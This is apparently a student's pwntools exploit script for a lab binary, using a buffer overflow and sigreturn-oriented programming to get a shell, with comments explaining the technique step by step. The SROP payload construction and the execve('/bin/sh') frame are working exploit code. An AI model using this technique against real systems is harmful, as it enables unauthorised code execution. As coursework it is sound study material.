#!/usr/bin/env python

from pwn import *

# download nasm with instructions from here https://stackoverflow.com/questions/36144930/steps-to-install-nasm-offline-on-ubuntu

# Let's do a checksec to see what we're working with:

# $ checksec ./bin/ex3
# [*] '/home/aapostol/workspace/osds/lab7/bin/ex3'
#     Arch:       amd64-64-little
#     RELRO:      No RELRO
#     Stack:      No canary found
#     NX:         NX unknown - GNU_STACK missing
#     PIE:        No PIE (0x400000)
#     Stack:      Executable
#     Stripped:   No

# Pretty much no protections whatsoever
# To get a shell, we can make a systemcall to execve
# We have the "/bin/sh" `gift` so we can make use of that for the argument of execve

# Let's inspect the read_buf function. We can see that we can cause a buffer overflow. So then we can surely change the return address
# The hint we get is the title: Signal-Return Oriented Programming

# Let's see if we can find some usefull ROP gadgets for now
# $ ROPgadget --binary ./bin/ex3
# 0x0000000000401019 : syscall
# 0x000000000040101b : ret

# Let's get other interesting addresses
read_buf_address = 0x40101c

# pwndbg> search "/bin/sh"
# Searching for value: '/bin/sh'
# ex3             0x402000 0x68732f6e69622f /* '/bin/sh' */
bin_sh_address = 0x402000

# for execve system call we need to put 59 into eax, `bin_sh_address` into rdi, 0 into rsi and 0 into rdx
# https://cr0mll.github.io/cyberclopaedia/Exploitation/Binary%20Exploitation/Stack%20Exploitation/Sigreturn-oriented%20Programming%20(SROP).html

target = process("./bin/ex3")

# When a signal occurs in Linux, the kernel stores the state of the process by constructing a Signal Frame on the stack. Once the signal has been processed, the rt_sigreturn syscall is envoked to restore the process's state from the stack. rt_sigreturn, however, does not check whether or not the state it is restoring from the stack is the same as the state that the kernel pushed onto it.
# IMPORTANT: When rt_sigreturn is invoked, the top 248 bytes of the stack will be restored into the above locations.
# We can manually trigger a rt_sigreturn system call by putting 15 into rax and then having a rop gadget to `syscall`
# INTERESTING to note that the read syscall returns the number of bytes read into rax

# Idea:
# In the first read, cause a buffer overflow sending 64 bytes of rubbish, then overwrite the ret_address with `read_buf_address`
# Send another return address to syscall rop gadget then put the signal frame
# This happens in the first read. When ret is called, we enter the second read
# Send just 15 rubbish bytes. When we return from the function, we will have 15 into rax and RIP now pointing to the
# `syscall` rop gadget, triggering a syscall. That syscall is for `sys_rt_sigreturn` which will consume the bytes above
# (the frame we consctructed) to return the program state

# We construct a signal return frame that represents the state of the process before handling the syscall
context.binary = ELF("./bin/ex3", checksec=False)
signal_frame = SigreturnFrame()
signal_frame.rax = 59
signal_frame.rdi = bin_sh_address
signal_frame.rsi = 0
signal_frame.rdx = 0
# We set the return address to a ROP gadget with syscall
signal_frame.rip = 0x401019

# First send the payload that overwrites the return address with read_buf, another syscal for the sys_rt_sigreturn systemcall, then the sig frame
payload = 64 * b'Z' + p64(read_buf_address) + p64(0x401019) + bytes(signal_frame)
target.sendline(payload)

# Now we are in the second read_buf call
# Send 15 bytes so that we can store 15 into rax for the sys_rt_sigreturn systemcall
target.sendline(14 * b'Z') # 14 bytes + newline

target.interactive()
